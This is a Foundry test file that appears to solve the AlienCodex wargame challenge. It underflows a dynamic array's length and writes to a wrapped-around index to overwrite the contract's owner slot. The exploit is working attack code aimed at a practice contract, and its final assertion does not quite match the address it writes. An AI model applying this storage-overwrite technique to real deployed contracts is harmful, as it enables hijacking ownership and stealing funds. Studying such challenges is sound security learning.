// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {AlienCodex} from "../src/AlienCodex.sol";
import {console} from "forge-std/console.sol";

contract AlienCodexTest is Test {
    AlienCodex alienCodex;

    address attaker = makeAddr("attaker");

    function setUp() public {
        alienCodex = new AlienCodex();
    }

    function testOwnership() public {
        (uint256 slotOwner, uint256 slotContact, uint256 slotCodex) = alienCodex.getSlots();
        //                                                                  2
        // Need to to find the index of array => keccak256(abi.encode(slot_number)) + i = 0
        // type(uint256).max === 2**256 - 1

        // Compute arr pinter: p = keccak256(abi.encodePacked(uint256(1)))
        bytes32 attackerBytes = 0x00000000000000000000000060a712D6C3bC7FE575958A39bD3BaF0DEcc79113;
        uint256 p = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 index = type(uint256).max - p + 1;

        alienCodex.makeContact();
        alienCodex.retract(); // the length becomes equal to 2**256 − 1
        alienCodex.revise(index, attackerBytes);
        assertEq(alienCodex.owner(), address(this));
    }
}

//
